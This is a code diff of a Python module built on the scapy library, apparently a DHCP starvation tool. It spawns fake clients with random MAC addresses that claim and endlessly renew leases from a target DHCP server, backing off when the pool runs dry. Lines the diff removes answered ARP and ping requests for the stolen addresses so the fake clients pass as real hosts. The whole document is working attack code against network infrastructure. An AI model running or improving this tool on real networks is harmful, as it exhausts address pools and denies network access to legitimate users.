@@ -5,28 +5,26 @@ from threading import Thread
 from time import sleep
 
 from scapy.arch import str2mac
-from scapy.config import conf
 from scapy.layers.dhcp import DHCP, BOOTP
-from scapy.layers.inet import IP, ICMP, UDP
-from scapy.layers.l2 import Ether, ARP
-from scapy.sendrecv import sr1, sendp, sniff, srp1, send
+from scapy.layers.inet import IP, UDP
+from scapy.layers.l2 import Ether
+from scapy.sendrecv import sendp, sniff
 from scapy.utils import mac2str
 from scapy.volatile import RandMAC
 
 OFFER = 2
 ACK = 5
-NAK = 6
 
-TIMEOUT = 3
+TIMEOUT = 2
 
 
 class Client(Thread):
-    iface = conf.iface  # default interface
-    target = conf.route.route("0.0.0.0")[2]  # default DHCP server
-    target_mac = None
+    iface = None
+    target = None
     lock = None
     persist = False
     addresses = {}  # all the address we have
+    time_for_sleep = 1
 
     def __init__(self):
         Thread.__init__(self)
@@ -47,9 +45,6 @@ class Client(Thread):
         self.discover()
         offer_packet = self.sniffer(OFFER)
 
-        if not offer_packet:
-            return  # if timeout occurs stop the current thread
-
         self.replace_ip(offer_packet[BOOTP].yiaddr)  # check if we get different ip address
 
         time_for_release = dict([ops for ops in offer_packet[DHCP].options if len(ops) == 2])['lease_time']
@@ -57,9 +52,9 @@ class Client(Thread):
         self.request()
         ack_packet = self.sniffer(ACK)
         if not ack_packet:
-            self.kill_thread()
+            self.kill_client()
 
-        self.replace_ip(offer_packet[BOOTP].yiaddr)  # check if we get different ip address
+        self.replace_ip(offer_packet[BOOTP].yiaddr)  # update the ip address
 
         # every loop we renew the same ip address
         while True:  # renew the lease infinite times
@@ -68,18 +63,18 @@ class Client(Thread):
             ack_packet = self.sniffer(ACK)
             if ack_packet:  # receive ack packet successfully
                 time_for_release = dict([ops for ops in ack_packet[DHCP].options if len(ops) == 2])['lease_time']
-                self.replace_ip(offer_packet[BOOTP].yiaddr)  # check if we get different ip address
+                self.replace_ip(offer_packet[BOOTP].yiaddr)  # update the ip address
                 continue  # renew the lease
             else:  # not receiving ack
                 sleep(time_for_release * (0.885 - 0.5))  # wait for 88.5% of the lease time
                 self.request()
                 ack_packet = self.sniffer(ACK)
                 if not ack_packet:  # if not receive ack packet
-                    self.kill_thread()
+                    self.kill_client()
                 time_for_release = dict([ops for ops in ack_packet[DHCP].options if len(ops) == 2])['lease_time']
+                self.replace_ip(offer_packet[BOOTP].yiaddr)  # update the ip address
 
     def sniffer(self, op):
-
         packets = sniff(
             count=1,
             iface=Client.iface,
@@ -87,29 +82,29 @@ class Client(Thread):
             lfilter=lambda p:
             BOOTP in p and
             p[IP].src == Client.target and  # accept packets only from the target DHCP server
-            # the packet is from server (OFFER, ACK or NAC)
             p[BOOTP].xid == self.transaction_id and  # the packet is for the current client
-            dict([ops for ops in p[DHCP].options if len(ops) == 2])['message-type'] in [op, NAK],
+            dict([ops for ops in p[DHCP].options if len(ops) == 2])['message-type'] == op,  # the packet type
         )
 
-        if len(packets) == 0 or dict(
-                [ops for ops in packets[0][DHCP].options if len(ops) == 2]
-        )['message-type'] == NAK:  # if timeout occurs or we receive NAC
+        if op == OFFER and len(packets) == 0:  # if timeout occurs for Offer
             if not Client.persist:
                 # if not persistent the program terminated when the server is down
-                os._exit(0)
+                Client.lock.acquire(blocking=True)  # catch the lock, stop creating new clients
+                sleep(TIMEOUT * 3)  # wait for clients to finish their connections
+                os._exit(0)  # terminate the program
             # all the threads that not receive answer while its lock are going to be killed
             elif Client.lock.acquire(blocking=True, timeout=TIMEOUT):
                 # stop create clients, DHCP server is down
-                print('========= LOCK Locked =========')
-                sleep(TIMEOUT * 10)  # try again after TIMEOUT * 10 seconds (if real client disconnect)
+                print(f'========= LOCK Locked for {Client.time_for_sleep} seconds=========')
+                sleep(Client.time_for_sleep)  # try again after time_for_sleep seconds (if real client disconnect)
+                Client.time_for_sleep *= 2  # the time we sleep goes up exponentially
                 Client.lock.release()
                 print('========= LOCK Release =========')
-                return False
-            else:  # if the lock is acquired that's mean that we send too many requests
-                # close current thread
-                self.kill_thread()
 
+            # close current thread
+            self.kill_client()
+        elif op == ACK and len(packets) == 0:
+            return False
         else:  # successfully receive the packet
             print(f'{"A" if op == 5 else "O"}: 0x{self.transaction_id:08x}')
             return packets[0]
@@ -121,11 +116,12 @@ class Client(Thread):
         """
         if new_ip == self.ip:
             return
-        if self.ip in Client.addresses: del Client.addresses[self.ip]
+        if self.ip in Client.addresses:
+            del Client.addresses[self.ip]
         self.ip = new_ip
         Client.addresses[new_ip] = self.mac
 
-    def kill_thread(self):
+    def kill_client(self):
         """
         It deletes the client's IP address from the dictionary of addresses
          and exits the thread
@@ -151,8 +147,9 @@ class Client(Thread):
         )
         Thread(target=self.sleep_and_send, args=packet).start()
 
-    def sleep_and_send(self, packet):
-        sleep(0.25)
+    @staticmethod
+    def sleep_and_send(packet):
+        sleep(0.1)
         sendp(packet, iface=Client.iface, verbose=0)
 
     def request(self):
@@ -173,65 +170,3 @@ class Client(Thread):
                      'end']
         )
         Thread(target=self.sleep_and_send, args=packet).start()
-
-
-def arp_is_at():
-    """
-    It listens for ARP who-has packets, and responds with ARP is-at packets
-    """
-    sniff(
-        iface=Client.iface,
-        lfilter=lambda p:
-        ARP in p and
-        p[ARP].op == 1 and  # its arp who-as type
-        p[ARP].pdst in Client.addresses,  # the packet is for one of the clients
-        prn=lambda p:
-        # send arp is-at
-        sendp(
-            Ether(
-                src=Client.addresses[p[ARP].pdst],
-                dst=p[Ether].src
-            ) / ARP(
-                op=2,  # is-at
-                hwsrc=Client.addresses[p[ARP].pdst],
-                hwdst=p[Ether].src,
-                psrc=p[ARP].pdst,
-                pdst=p[ARP].psrc,
-            ),
-            verbose=0,
-            iface=Client.iface
-        ),
-    )
-
-
-def icmp_reply():
-    """
-    It listens for ICMP echo requests (ping) and sends ICMP echo replies (pong) to the source
-    """
-    sniff(
-        iface=Client.iface,
-        lfilter=lambda p:
-        ICMP in p and  # its icmp packet
-        p[IP].dst in Client.addresses and  # the packet is for one of the clients
-        p[ICMP].type == 8,  # its icmp echo request
-        prn=lambda p:
-        # send icmp echo reply
-        sendp(
-            Ether(
-                dst=p[Ether].src,
-                src=Client.addresses[p[IP].dst]
-            ) / IP(
-                dst=p[IP].src,
-                src=p[IP].dst
-            ) / ICMP(
-                type=0,
-            ),
-            iface=Client.iface,
-            verbose=0
-        )
-
-    )
-
-
-Thread(target=arp_is_at).start()  # run thread to answer all of arp request send to our ips
-Thread(target=icmp_reply).start()  # run thread to answer all of icmp pings send to our ips
